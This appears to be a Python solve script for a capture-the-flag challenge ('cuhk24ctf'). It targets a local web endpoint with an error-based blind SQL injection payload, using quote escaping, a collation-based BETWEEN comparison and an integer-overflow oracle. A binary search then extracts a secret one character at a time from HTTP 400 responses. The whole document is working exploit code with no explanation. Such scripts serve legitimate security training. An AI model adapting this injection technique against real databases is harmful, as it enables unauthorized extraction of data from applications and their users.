import requests, string, time

charset = sorted(string.ascii_letters + string.digits + "{_-\\}", key=lambda x: ord(x))
url = "http://localhost:24021/query"
formatter = "\\' OR description COLLATE \"C\" BETWEEN $$Flagmon stores a flag called {left}$$ AND $$Flagmon stores a flag called {right}$$ AND id - 2147483647 - 100 BETWEEN 0 AND 1 --"

flag = "cuhk24ctf{"

last_attempt = 0

def attempt(char):
    global last_attempt

    # rate limit ourselves according to the source code
    curr = time.time()
    time.sleep(max(0, last_attempt + 1 - curr))

    req = requests.post(url, data={"value": formatter.format(left=flag, right=flag + char + '}')})

    # update the last attempt time
    last_attempt = time.time()
    
    return req.status_code == 400

# returns the character for the next position
def search_func():
    l = -1
    r = len(charset) - 1
    # cuhk24ctf{ <=> cuhk24ctf{}
    # smaller than cuhk24ctf{t -> false
    # larger or equal to cuhk24ctf{t -> true
    while l + 1 < r:
        m = (l + r) >> 1
        if attempt(charset[m]):
            # OK
            r = m
        else:
            l = m
    return charset[r]

while flag[-1] != '}':
    # search
    next_char = search_func()
    flag += next_char
    print(flag)
